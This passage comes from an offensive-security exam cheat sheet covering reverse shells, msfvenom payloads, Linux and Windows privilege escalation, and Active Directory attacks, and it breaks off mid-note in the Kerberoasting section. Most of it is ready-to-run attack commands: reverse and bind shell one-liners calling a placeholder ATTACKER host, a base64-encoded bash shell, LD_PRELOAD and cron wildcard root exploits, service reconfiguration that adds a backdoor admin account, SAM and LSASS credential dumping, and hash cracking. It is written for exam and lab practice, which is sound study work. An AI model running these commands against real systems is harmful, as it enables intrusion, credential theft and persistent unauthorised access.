python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```
No-`-e` netcat fallback (modern `nc` usually *lacks* `-e`):
```bash
mkfifo /tmp/f; nc ATTACKER 443 </tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
PHP self-connecting one-liner (for a PHP app):
```bash
php -r '$s=fsockopen("ATTACKER",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Base64-encoded (when the RCE sink chokes on pipes/brackets):
```bash
echo -e "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDMgMD4mMQ==" | base64 -d | bash
```
Windows PowerShell (generate the Base64 at revshells.com):
```powershell
powershell -nop -w hidden -e <base64>
```
Bind shell (when reverse is blocked — target listens, you connect in):
```bash
# on target:
nc -lvnp 4444 -e /bin/sh
# on Kali:
nc -nv $IP 4444
```

> [!note]
> - `>&` and `/dev/tcp` are bash-isms; on a true POSIX `sh` you may need the `mkfifo` variant instead.
> - `/bin/bash` vs `bash` (and `/bin/sh` vs `sh`) only matters when `PATH` is weird — prefer the absolute path from a limited shell.
> - Use **revshells.com** to encode for the exact OS/shell; the Base64 PowerShell option sidesteps the quote-escaping that breaks pasted PS one-liners.
> - After you land, immediately stabilize the shell ([§11](#110--shell-stabilization)) so Ctrl-C and tab-complete work.

## 4.1 — msfvenom payloads (`[EXAM-OK]` — venom is exempt)

`TRIGGER:` you need a payload *file* (an uploaded binary, a WAR for Tomcat, a PHP payload). `msfvenom` and `multi/handler` are exempt from the one-MSF-target rule, so you can use them freely.

Windows executable:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o sh.exe
```
Windows DLL (for DLL-hijack/service payloads, [§6](#6--privilege-escalation-windows)):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o hijack.dll
```
Linux ELF:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o sh.elf
```
Tomcat WAR:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f war -o s.war
```
Shellcode for a BOF/exploit, with bad chars excluded:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
```

> [!note]
> - `-p` is the payload, `-f` the output format, `-o` the output file. `LHOST`/`LPORT` are *your* listener.
> - `-b` excludes bad characters (needed when feeding shellcode into a memory-corruption exploit).
> - Catch these with a plain `nc -lvnp 443`, or with `exploit/multi/handler` (also exempt) if you want Metasploit session handling.

## 4.2 — Famous exploits you'll actually reach for

`TRIGGER:` a version/service matches one of these. This is a *lookup table* of the classics — you'll grab the public PoC, not carry the exploit code here.

> [!warning]
> Read every PoC before running. Cite the URL in your report; if you modify it, include the diff + rationale ([§0.2](#02--proof--report-discipline-where-points-silently-vanish)). Confirm the version *precisely* — a near-miss version often isn't vulnerable, and chasing a patched CVE is a classic rabbit hole. Kernel exploits are a last resort ([§5](#5--privilege-escalation-linux)/[§6](#6--privilege-escalation-windows)) because they can crash the box.

| Vuln / CVE | Where | Quick note |
|---|---|---|
| **EternalBlue** MS17-010 | SMB 445, unpatched Win7/2008 | confirm with `nmap --script smb-vuln-ms17-010`; manual PoC or your `[MSF-1]` target |
| **MS08-067** | SMB, legacy Windows | classic unauth RCE on very old boxes |
| **BlueKeep** CVE-2019-0708 | RDP 3389, 2008/7 | risky (can BSOD) — usually avoid on exam |
| **Shellshock** CVE-2014-6271 | CGI over HTTP (`/cgi-bin/*.sh`) | inject via a header the CGI passes to bash; classic web→RCE |
| **Dirty COW** CVE-2016-5195 | Linux kernel ≤4.8 | local root; can be unstable — screenshot flags first |
| **DirtyPipe** CVE-2022-0847 | Linux 5.8–5.16 | clean local root primitive |
| **PwnKit** CVE-2021-4034 | pkexec (polkit) SUID | near-universal local root on older distros |
| **Sudo Baron Samedit** CVE-2021-3156 | sudo < 1.9.5p2 | local root |
| **Sudo < 1.8.28** CVE-2019-14287 | `sudo -u#-1` with `!ALL` | trivial local root when the sudoers rule matches |
| **Drupalgeddon2** CVE-2018-7600 | Drupal | unauth RCE |
| **Tomcat Ghostcat** CVE-2020-1938 | AJP 8009 | file read → sometimes RCE |
| **PrintNightmare** CVE-2021-1675 | Windows spooler | local/remote priv-esc |
| **Telerik** CVE-2019-18935 | ASP.NET UI upload | deserialization RCE |
| **Nostromo 1.9.6** CVE-2019-16278 | nhttpd | unauth RCE |
| **Samba usermap_script** CVE-2007-2447 | Samba 3.0.x | unauth RCE (`/=` username trick) |

> [!note] Windows enum → exploit workflow
> `systeminfo` gives the OS build + hotfix list; feed it to **WES-NG** (`windows-exploit-suggester-ng`) to map missing patches to kernel/privilege exploits. This is a *last-resort* privesc path ([§6.6](#66--ordered-fallback-chain)) — configuration bugs come first.

## 4.3 — Service-specific initial access (reference)

`TRIGGER:` you enumerated one of these services and have the access it needs.

> [!note] Common service → foothold routes
> - **MSSQL** `xp_cmdshell` ([§2.1](#mssql--1433)) — command exec as the SQL service account.
> - **Tomcat** WAR deploy ([§3.4](#34--exposed-admin-panels--default-creds)) — JSP execution via the manager app.
> - **Anonymous-writable FTP that maps to the webroot** ([§2.4](#24--file--share-enumeration) → [§3](#3--web-application-testing--foothold)) — upload a webshell, browse to it.
> - **Weak DB creds** → file-write/read routes to a shell (situational).
> - **Redis unauthenticated** → write an SSH key or a webshell (documented rogue-server path).
> - **Jenkins console / IRCd backdoors / distcc** — documented direct-execution paths for those specific services.

→ Got a shell? **Stabilize it ([§11](#110--shell-stabilization))** → grab `local.txt` + screenshot with IP → [§5](#5--privilege-escalation-linux)/[§6](#6--privilege-escalation-windows).

---
# 5 — Privilege Escalation: Linux

**TRIGGER:** any shell as a non-root user. Run the automated enum script **and** work the manual quick-wins below in parallel — don't wait for linpeas to finish before checking `sudo -l`.

## 5.0 — Automated enumeration

Kick off the enum script first; it runs while you check quick-wins by hand.

```bash
./linpeas.sh -a | tee linpeas.out
```

> [!note]
> - `-a` runs all checks; `tee` keeps a copy so you can scroll back. Read the **RED/YELLOW** highlights first — those are the flagged findings.
> - Transfer linpeas to the target via [§11](#111--file-transfer--which-method-when). Alternatives: `lse.sh -l1` (linux-smart-enumeration, quieter) and `pspy64` (watches processes/cron live, no root needed — great for catching scheduled jobs).

> [!tip] linPEAS priority reading — scan for these first (mind the colour codes)
> 1. `sudo -l` entries and the **sudo version** (Baron Samedit if < 1.9.5p2; `-u#-1` if < 1.8.28)
> 2. Unusual **SUID/SGID** binaries (anything not in the standard set)
> 3. **Capabilities** on interpreters
> 4. **Cron jobs** + writable cron scripts
> 5. **Writable files in `$PATH`** / writable service unit files
> 6. **Passwords** in configs/history/env (it greps for you)
> 7. **Kernel version** vs known exploits (PwnKit/DirtyPipe/DirtyCow)
> 8. **Docker/LXD/disk group** membership
> 9. **NFS `no_root_squash`** in `/etc/exports`
> 10. Readable `/etc/shadow` or private SSH keys
>
> Save the output with `tee` so you can grep it: `grep -iE 'password|no_root_squash|NOPASSWD' linpeas.out`

## 5.1 — Manual quick-wins (enumerate → exploit)

Work these in order — they're sorted by how often they land on easy/medium boxes. Each entry shows the check *and* the actual escalation.

### SUDO — the #1 easy/medium vector

Check what you're allowed to run via `sudo` before anything else. A single misconfigured entry can hand you a root shell instantly.

```bash
id ; sudo -l
```

**Exploit — allowed binary escape (GTFOBins):** if `sudo -l` shows e.g. `(root) NOPASSWD: /usr/bin/find`:
```bash
sudo find . -exec /bin/sh \; -quit
```

**Exploit — LD_PRELOAD** (when `sudo -l` shows `env_keep+=LD_PRELOAD`). Compile a tiny preload library:
```c
// x.c — standard GTFOBins LD_PRELOAD stub
#include <stdlib.h>
void _init(){ setgid(0); setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>
```

**Exploit — CVE-2019-14287** (sudo < 1.8.28, rule like `(ALL, !root) /bin/bash`):
```bash
sudo -u#-1 /bin/bash
```

> [!note]
> - `id` also flags interesting groups (`sudo`, `docker`, `lxd`, `disk`, `adm`) — each is its own escalation path.
> - Any allowed binary that can spawn a subshell or run a command → root: `find`, `awk`, `vim`, `less`, `nmap --interactive`, `python -c`, `tar --checkpoint-action`. Look each up on GTFOBins under "Sudo."
> - **LD_PRELOAD why it works:** `env_keep` preserves the variable through the sudo elevation; the linker loads your `.so` (running `_init` as root) before the real program. It only works *because* of the misconfig — a textbook local primitive, not a general exploit.

### SUID / SGID binaries

Find binaries that run as their owner (often root) regardless of who launches them.

```bash
find / -perm -4000 -type f 2>/dev/null
```
Broader SUID+SGID sweep with details:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

**Exploit — standard binary:** cross-reference GTFOBins "SUID", e.g.:
```bash
find . -exec /bin/sh -p \; -quit
```

**Exploit — custom SUID binary calling a command by relative name.** Inspect it, then hijack `PATH`:
```bash
strings /usr/local/bin/backup            # look for a bare call like system("tar ...")
cd /tmp; echo -e '#!/bin/sh\n/bin/bash -p' > tar; chmod +x tar
export PATH=/tmp:$PATH
/usr/local/bin/backup                    # runs your "tar" as root -> bash -p keeps euid 0
```

> [!example] `screen` SUID
> If `screen` is SUID root you can often reattach to a root session outright: `screen -x root/root`. Version-specific SUID exploits (e.g. Screen 4.5.0) exist too — searchsploit the version.

> [!note]
> - `-perm -4000` finds SUID; swap `-2000` for SGID. `bash -p` preserves the elevated effective UID.
> - A non-standard or custom SUID binary is the highest-value find here — `strings` it for command calls you can hijack.

### Capabilities

Linux capabilities grant slices of root power to specific binaries. `cap_setuid` on an interpreter is effectively root.

```bash
getcap -r / 2>/dev/null
```

**Exploit — `cap_setuid` on python:**
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> [!note]
> - `cap_setuid` on an interpreter = instant root.
> - `cap_dac_read_search` lets you read any file (e.g. dump `/etc/shadow`); `cap_dac_override` lets you write. Check GTFOBins "Capabilities."

### Cron jobs

Look for scheduled tasks that run as root and call a script or use a wildcard you can influence.

```bash
cat /etc/crontab ; ls -la /etc/cron.*
```
Catch cron jobs not in `/etc/crontab` (and other timed runs) live:
```bash
./pspy64
```

**Exploit — writable root cron script** (e.g. `* * * * * root /opt/backup.sh` and it's world-writable):
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
# after it runs as root:
/tmp/rootbash -p
```

**Exploit — cron wildcard injection** (root cron runs `tar czf backup.tar.gz *` in a dir you can write):
```bash
cd /that/dir
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# tar reads the crafted filenames as flags -> runs shell.sh as root
```

> [!note]
> - Run `pspy` first to catch cron jobs that aren't in `/etc/crontab`.
> - The `--checkpoint` trick works because the shell expands `*` into your crafted filenames, which `tar` then reads as options.

### Writable PATH / directories

A writable directory early in root's `PATH`, or a root script that calls a command by bare name, lets you shadow that command with your own (same PATH-hijack pattern as the custom-SUID example above).

```bash
echo $PATH ; find / -writable -type d 2>/dev/null | grep -vE 'proc|sys'
```
List listening services (a local-only service may be the real target):
```bash
netstat -tulpn 2>/dev/null || ss -tulpn
```

> [!note]
> If a privileged script runs e.g. `backup` (no absolute path) and you control a directory earlier in `PATH`, place your own `backup` there and it runs with the script's privileges. A service listening only on `127.0.0.1` is often the intended escalation — port-forward it out ([§11](#112--port-forwarding--tunneling--when-to-use-which)) or exploit it locally.

### Kernel / distro version (last resort)

Only after the above — kernel exploits can crash the box, so screenshot any flags you already have first.

```bash
uname -a ; cat /etc/os-release
```

> [!warning]
> Feed the kernel/distro version to `searchsploit` (PwnKit, DirtyPipe, Baron Samedit — [§4.2](#42--famous-exploits-youll-actually-reach-for)). Treat this as the fallback when configuration-based vectors are exhausted, not a first move.

## 5.2 — NFS no_root_squash (worked exploit)

`TRIGGER:` an NFS export (from [§2.1](#nfs--2049)) is marked `no_root_squash`. That means root on *your* machine stays root on the share — so you plant a root-owned SUID binary the target will honor.

On **Kali** (where you're root), mount the export and plant a SUID shell:
```bash
mkdir /mnt/nfs && mount -t nfs $IP:/export /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash
```
Back on the **target**:
```bash
/export/rootbash -p     # runs as root: the SUID bit + root owner survived the share
```

> [!note]
> Works only when the export is `no_root_squash` (root isn't downgraded to `nobody`). That flag in `showmount -e` output is a flashing green light.

## 5.3 — Ordered fallback chain

When one vector dead-ends, walk down this list rather than fixating:

`sudo -l` → SUID → capabilities → cron → writable service/PATH → group memberships (docker/lxd/disk) → NFS `no_root_squash` → password reuse (`su` with creds you found) → local-only listening service → kernel exploit (last, can crash the box → screenshot flags first).

> [!example] Group-membership escapes (from `id`)
> - **docker** → `docker run -v /:/mnt -it alpine chroot /mnt sh` (mount host root inside a container as root).
> - **lxd/lxc** → import a tiny image, launch it privileged with the host disk mounted, chroot.
> - **disk** → `debugfs /dev/sdaX` to read any file (grab `/etc/shadow`, or write an SSH key).
> - **adm** → read logs (`/var/log`) that often contain creds.

## 5.4 — Ordered attack checklist ("if you have X, do Y")

- [ ] `id` → in `docker`/`lxd`/`disk`/`adm` group? → group-specific root escape
- [ ] `sudo -l` → any entry? → GTFOBins / LD_PRELOAD / `-u#-1`
- [ ] SUID/SGID → GTFOBins
- [ ] `getcap` → `cap_setuid` → root one-liner
- [ ] cron + `pspy` → writable script / wildcard injection
- [ ] writable `$PATH` dir → shadow a called binary
- [ ] creds in files/history/configs → `su`/`ssh` reuse + **spray everywhere**
- [ ] NFS `no_root_squash` → SUID-root plant
- [ ] local-only listening service → forward + exploit
- [ ] kernel version → PwnKit/DirtyPipe (last)

→ root? **Grab `proof.txt` + screenshot with IP.**

---
# 6 — Privilege Escalation: Windows

**TRIGGER:** any shell as a non-SYSTEM/non-admin user.

## 6.0 — First commands, always

Before anything else, read your token privileges and groups — they usually decide the entire path.

```cmd
whoami /priv
```
```cmd
whoami /groups
```
```cmd
whoami /all
```
```cmd
systeminfo
```

> [!warning]
> **`SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` shown as Enabled → you are effectively SYSTEM already.** Service accounts (IIS `iis apppool\*`, MSSQL, other services) hold these by default. Go straight to the Potato family ([6.1](#61--token-abuse-the-potato-family)) — *the* most common service-account → SYSTEM path on the exam.

> [!note]
> - `whoami /groups` flags membership in privileged groups (Administrators, Backup Operators, etc.).
> - `systeminfo` gives OS build and hotfixes — feed to **WES-NG**/**Watson** to find missing-patch escalations (a last resort).

Run the enum tool while you check the manual vectors below:
```cmd
.\winPEASx64.exe
```

> [!note]
> Alternatives: `PowerUp.ps1` (`Invoke-AllChecks`) for service/registry misconfigs specifically, and `Seatbelt.exe -group=all` for a broad host survey. `accesschk.exe` answers the specific "can I write this?" questions.

> [!tip] winPEAS priority reading — scan for these first (mind the colour codes)
> 1. **`whoami /priv`** → `SeImpersonate`/`SeAssignPrimaryToken` (Potato), `SeBackup`/`SeRestore`, `SeDebug`, `SeLoadDriver`
> 2. **Unquoted service paths** with a writable segment
> 3. **Modifiable services / service binaries / service registry keys**
> 4. **AlwaysInstallElevated** (both keys = 1)
> 5. **Stored creds:** `cmdkey`, autologon, `unattend.xml`, saved RDP/PuTTY/WinSCP/mRemoteNG
> 6. **Writable scheduled-task** binaries
> 7. **DLL-hijackable** paths (writable dir on a service's search path)
> 8. **Credentials in files/registry** (it greps)
> 9. Installed **software versions** → searchsploit

## 6.1 — Token abuse: the Potato family

`TRIGGER:` `whoami /priv` shows `SeImpersonate` or `SeAssignPrimaryToken` enabled. The Potato tools abuse that privilege to run a command as SYSTEM. Pick the variant by Windows version.

Modern Windows (2019/2022/10/11) — widest coverage:
```cmd
GodPotato -cmd "cmd /c whoami"
```
When the print spooler is available — very reliable:
```cmd
.\PrintSpoofer64.exe -i -c cmd
```
Older targets (2016 and earlier):
```cmd
.\JuicyPotatoNG.exe -t * -p cmd.exe
```

> [!note]
> - These take a low-priv service token and impersonate SYSTEM with it — the privilege is *designed* to let services do this, which is why it's so clean.
> - Verify with `whoami` in the spawned context; swap it for a reverse-shell trigger once confirmed.
> - **If Potato fails:** confirm the privilege is actually *Enabled* (not just present); check the spooler is running for PrintSpoofer (`sc query spooler`); try another variant; then fall through to the service/registry vectors below.
> - **JuicyPotato/RoguePotato lineage** (older): JuicyPotato works up to ~Server 2016; on 2019+ use RoguePotato/GodPotato/PrintSpoofer. On Server 2003-era, Churrasco is the equivalent.

## 6.2 — Service misconfigurations

`TRIGGER:` a service you can influence runs as SYSTEM. Four distinct flavors — check each.

### (a) Insecure service permissions

You can reconfigure a service's binary path (`binPath`), so you point it at your own command and restart it.

Find services you can modify, then inspect one:
```cmd
accesschk.exe /accepteula -uwcqv "user" *
```
```cmd
sc qc <service>
```

**Exploit — repoint the binary to add yourself to local admins, then restart:**
```cmd
sc config <service> binPath= "cmd /c net user pwn Pass123! /add && net localgroup administrators pwn /add"
sc stop <service> & sc start <service>
```

> [!note]
> - `SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS` means you can repoint `binPath`; stop/start (or a reboot if auto-start) runs it as the service account (usually LocalSystem).
> - **The space after `binPath=` is required.** Adding a user is the cleanest exam PoC (screenshot `net localgroup administrators`), then `runas`/RDP/evil-winrm in as `pwn`.

### (b) Unquoted service paths

A service path with spaces and no quotes makes Windows try each space-delimited prefix as an executable — if you can write to an earlier segment, your file runs first.

```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i """"
```

**Exploit — drop a payload at the first writable intercept, then restart:**
```cmd
:: generate (msfvenom is exam-legal):
:: msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o "C:\Program Files\Vuln.exe"
sc stop <service> & sc start <service>
```

> [!note]
> `C:\Program Files\My App\svc.exe` unquoted makes Windows try `C:\Program.exe` first, then `C:\Program Files\Vuln.exe`, before the real path. Confirm your write access with `accesschk.exe -uwdq "C:\Program Files\"` and the unquoted path with `sc qc <service>`.

### (c) Weak service binary permissions

If you can overwrite the service's own executable, you replace it and restart the service.

```cmd
accesschk.exe /accepteula -quvw "C:\Path\service.exe"
```

> [!note]
> Write access (`w`, or `FILE_ALL_ACCESS`) on the binary means you swap it for your own; the service runs it as SYSTEM on next start. **Exploit chain:** back up the original → replace with your payload exe → restart the service → restore afterward. Simplest of the four when it applies.

### (d) Service DLL hijacking

`TRIGGER:` a service loads a DLL from a writable directory or a path where the DLL is missing (PowerUp flags this).

```cmd
:: identify a missing/writable DLL on the search path with Procmon (NAME NOT FOUND) or PowerUp
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o hijack.dll
:: place hijack.dll where the service looks first, restart the service
```

> [!note]
> The *finding* is the skill: Procmon filtered to the service process, Result = `NAME NOT FOUND`, Path ends `.dll`, in a directory you can write. Place a DLL the service loads first so it runs with the service's privileges. msfvenom generates the DLL (exam-legal); weaponized DLL source is intentionally not shipped here.

## 6.3 — Scheduled tasks

`TRIGGER:` a scheduled task runs as SYSTEM/admin and calls a script or binary you can write to.

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run:As Task To Run"
```

**Exploit — the task runs `C:\Scripts\job.bat` as SYSTEM and you can write it:**
```cmd
echo net user pwn Pass123! /add ^& net localgroup administrators pwn /add >> C:\Scripts\job.bat
:: wait for the schedule (or trigger it) -> runs as SYSTEM
```

> [!note]
> Confirm write with `accesschk.exe -quvw C:\Scripts\job.bat`. PowerShell equivalent to find tasks: `Get-ScheduledTask | % { $_.Actions }`, then `icacls` the referenced binary. If you can't wait for the trigger and can't run it, note it and move on.

## 6.4 — Privilege-specific escalations (the `whoami /priv` decoder)

`TRIGGER:` `whoami /priv` shows a privilege other than the impersonate pair. Each maps to a concrete technique.

### SeBackup / SeRestore

These privileges let you read protected files (the registry hives that hold password hashes) even without being admin.

```cmd
reg save HKLM\SAM sam.hive
```
```cmd
reg save HKLM\SYSTEM system.hive
```

> [!note]
> With `SeBackupPrivilege` you copy the SAM and SYSTEM hives, exfil them ([§11](#111--file-transfer--which-method-when)), and extract local hashes offline with `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`. Those hashes then feed pass-the-hash ([§7](#7--active-directory-attacks)). On a DC, the same privilege reads `NTDS.dit`. `SeRestore` additionally lets you *write* protected locations (e.g. swap a service binary or an image-file-execution-options debugger).

### SeLoadDriver

Loading a driver gets you kernel-level code execution via a known-vulnerable signed driver.

> [!note]
> The classic chain registers a service pointing at a vulnerable driver (e.g. Capcom.sys) and loads it with an `EoLoadDriver`/`SeLoadDriverPrivilege` PoC, then triggers the driver's IOCTL to run code as SYSTEM. Reference the Fuse/SeLoadDriverPrivilege writeups ([§9.2](#92--reference-sites-bookmark--offline-copies-where-possible)). Involved — reach for it only when `SeLoadDriver` is what you've got.

### SeDebug / SeTakeOwnership / SeManageVolume

> [!note]
> - **SeDebug** → open any process; dump LSASS (`procdump -ma lsass.exe` or `rundll32 comsvcs.dll`) and pull creds with mimikatz/pypykatz.
> - **SeTakeOwnership** → `takeown`/`icacls` to seize a SYSTEM-run binary or registry key, then modify it.
> - **SeManageVolume** → a documented chain to arbitrary write → DLL plant → SYSTEM.

## 6.5 — Other Windows vectors

### AlwaysInstallElevated

If both registry keys are set, any MSI installs as SYSTEM.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

> [!note]
> Both keys must equal `1`. Then an MSI you supply runs as SYSTEM via `msiexec /i evil.msi /quiet /qn /norestart` — generate it with `msfvenom -f msi` (exam-legal).

### Stored credentials / autologon

Windows squirrels away passwords in several predictable spots.

Autologon credentials in the registry:
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
Saved credentials:
```cmd
cmdkey /list
```

> [!note]
> A `DefaultPassword` value under Winlogon is a plaintext autologon credential. `cmdkey /list` shows stored creds you reuse with `runas /savecred /user:admin cmd`. Also sweep `unattend.xml`/`sysprep.xml`, mRemoteNG, and config files ([§2.4](#24--file--share-enumeration)) for deployment passwords.

## 6.6 — Ordered fallback chain

`whoami /priv` (Potato if impersonate) → service perms/unquoted/binary/DLL → scheduled task → AlwaysInstallElevated → stored creds/autologon/cmdkey → SeBackup/registry SAM → other token privileges (`SeLoadDriver`, `SeDebug`, `SeTakeOwnership`, `SeManageVolume`) → UAC bypass if already admin but not elevated → kernel exploit via `systeminfo` + WES-NG (last).

## 6.7 — Exam-legal GUI tools for Windows work

> [!note] Allowed GUI tools that genuinely speed up Windows targets
> - **xfreerdp / Remmina** — RDP in for a real desktop once you have creds (`xfreerdp /v:$IP /u:user /p:pass /cert:ignore`).
> - **BloodHound GUI** — visualize the path to DA (the whole point of [§7](#7--active-directory-attacks)).
> - **Process Monitor / Process Explorer / Autoruns (Sysinternals)** — Procmon is *the* tool for finding DLL-hijack and writable-binary opportunities; Autoruns surfaces auto-start weak points.
> - **Ghidra** — reverse a custom service binary you found (allowed; it's analysis, not automated exploitation).
> - **Wireshark** — inspect a weird protocol or confirm a callback.
> - **Burp Free** — repeater/intercept for the web foothold.
>
> Only the *automated exploitation / scanning* tools (sqlmap, Nessus, MSF beyond your one target, AI) are off-limits — reversing/analysis GUIs are fine.

## 6.8 — Ordered attack checklist ("if you have X, do Y")

- [ ] `whoami /priv` → SeImpersonate → Potato
- [ ] `whoami /priv` → SeBackup/SeRestore → dump SAM+SYSTEM → secretsdump
- [ ] `whoami /priv` → SeDebug → dump LSASS; SeLoadDriver → driver load
- [ ] `whoami /groups` → privileged group?
- [ ] service perms / unquoted / weak binary / DLL hijack
- [ ] scheduled tasks writable
- [ ] AlwaysInstallElevated (both keys = 1)
- [ ] stored creds (`cmdkey`, autologon, unattend, mRemoteNG, SAM via SeBackup)
- [ ] creds in files/registry → **spray everywhere**
- [ ] `systeminfo` → WES-NG missing-patch (last)

→ SYSTEM? **Grab `proof.txt` + screenshot with IP.** Domain-joined? → [§7](#7--active-directory-attacks).

---
# 7 — Active Directory Attacks

**Scope.** The 40-point AD set is **one chain**: foothold → enumerate the domain → get creds → move laterally → reach the DC. You start with a given domain user+password. `TRIGGER:` port 88/389 anywhere, or a domain-joined box. Treat all three machines as a single objective.

> [!danger] Exam reminder
> **Responder poisoning/spoofing and all LLMNR/NBT-NS/mDNS answering are `[BANNED-EXAM]`** ([§0.1](#01--tool-restrictions--read-this-it-cost-you-before)). The Responder/relay flows below are labeled and are **lab/practice only** — do not run them on the exam. Everything else here is exam-legal.

## 7.0 — AD Enumeration

### Unauthenticated (DC IP known)

Even before you use the given creds, some enumeration works anonymously.

Enumerate valid usernames (no lockout risk):
```bash
kerbrute userenum -d corp.com --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
Try a null SMB session:
```bash
crackmapexec smb $IP -u '' -p '' --shares
```
Null RPC user enumeration:
```bash
rpcclient -U "" -N $IP -c 'enumdomusers'
```
Find domain controllers via DNS SRV records:
```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.corp.com $IP
```

> [!note]
> `kerbrute userenum` is safe to run first — it validates usernames against Kerberos without triggering account lockouts, giving you a user list for spraying and roasting.

### Authenticated — BloodHound collection (the centerpiece)

With any domain credential, collect the whole graph. BloodHound then shows the shortest path to Domain Admin.

Collect remotely from Kali:
```bash
bloodhound-python -u user -p 'pass' -d corp.com -ns $IP -c all --zip
```
Or collect on a Windows foothold:
```cmd
.\SharpHound.exe -c All --zipfilename loot
```

> [!note]
> `-c all` gathers every collection method; the output `.zip` imports into the BloodHound GUI (setup in [§10.3](#103--setup-bloodhound-ce-the-one-that-trips-people-up)). On a Windows host, SharpHound is the native collector.

### Manual authenticated enumeration (BloodHound fallback + confirmation)

Users, groups, shares, password policy in one call:
```bash
crackmapexec smb $IP -u user -p pass --users --groups --shares --pass-pol
```
Find where accounts are logged in (hunt for admin sessions):
```bash
crackmapexec smb $IP -u user -p pass --loggedon-users
```
Enumerate the password policy (know lockout BEFORE spraying):
```bash
crackmapexec smb $IP -u user -p pass --pass-pol
```
Snaffler — hunt creds across every share the account can read (on a Windows foothold):
```cmd
.\Snaffler.exe -d CORP.LOCAL -s -v data
```
Resolve DNS records over LDAP (find hidden hosts) — `[LAB]`:
```bash
adidnsdump -u corp\\user ldap://$IP
adidnsdump -u corp\\user ldap://$IP -r
```

> [!note]
> `--pass-pol` tells you the lockout threshold *before* you spray — critical so you don't lock accounts. `--loggedon-users` helps you find a box where a Domain Admin is logged in (a credential-dump target). Full domain-user/group enumeration lives in the **[rpcclient reference](#rpc--135--139--593)**. Snaffler is the fastest way to surface passwords in shares once you have a foothold.

## 7.0.1 — BloodHound + Cypher (the simple queries you keep needing)

**Setup:** see [§10.3](#103--setup-bloodhound-ce-the-one-that-trips-people-up). Import your `.zip`, then mark owned nodes (right-click → *Mark as Owned*) so path queries start from what you control. Run the prebuilt analytics — *Shortest Path to Domain Admins*, *Find Principals with DCSync Rights*, *Find Kerberoastable Accounts*, *Shortest Paths from Owned Principals* — before writing custom queries.

> [!tip] Readable Cypher help
> Bookmark `https://bloodhound.readthedocs.io` and the `hausec` Cypher cheatsheet (search that name) — the readable references for when you need a query that isn't a prebuilt button. `wadcoms.github.io` and `thehacker.recipes` map each BloodHound edge to the exact command that abuses it.

**Common Cypher (paste into the raw query bar):**
```cypher
// mark a node owned
MATCH (u {name:"USER@CORP.COM"}) SET u.owned=true RETURN u

// list all Domain Admins
MATCH (g:Group) WHERE g.name STARTS WITH "DOMAIN ADMINS" MATCH (u)-[:MemberOf*1..]->(g) RETURN u.name

// all kerberoastable users (have an SPN)
MATCH (u:User {hasspn:true}) RETURN u.name

// all AS-REP roastable users (no preauth)
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// shortest path from ALL owned nodes to Domain Admins
MATCH (o) WHERE o.owned=true MATCH p=shortestPath((o)-[*1..]->(g:Group))
WHERE g.name STARTS WITH "DOMAIN ADMINS" RETURN p

// who can DCSync the domain
MATCH p=(n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p

// where can my owned users admin / RDP / PSRemote?
MATCH p=(u {owned:true})-[:AdminTo|CanRDP|CanPSRemote]->(c:Computer) RETURN p

// dangerous ACL edges FROM anything I own
MATCH p=(u {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember]->(t) RETURN p

// list all computers / all users (simple sanity)
MATCH (c:Computer) RETURN c.name
MATCH (u:User) RETURN u.name
```

> [!note]
> The query list is grouped on purpose — a reference sheet you scan, not a sequence. The two "simple sanity" queries at the bottom are the ones you'll reach for constantly.

## 7.1 — Credential Attacks

### Kerberoasting

`TRIGGER:` any domain credential + service accounts with SPNs. Cracks *service account* passwords offline — no admin needed, and service accounts often have weak passwords.

Request the roastable hashes (from Kali):
```bash
impacket-GetUserSPNs corp.com/user:pass -dc-ip $IP -request -outputfile kerb.hash
```
Request a ticket for one specific SPN user:
```bash
impacket-GetUserSPNs corp.com/user:pass -dc-ip $IP -request-user sqldev -outputfile sqldev.hash
```
Crack them:
```bash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
```
On a Windows foothold instead (Rubeus):
```cmd
.\Rubeus.exe kerberoast /nowrap /outfile:kerb.hash
```

> [!note]
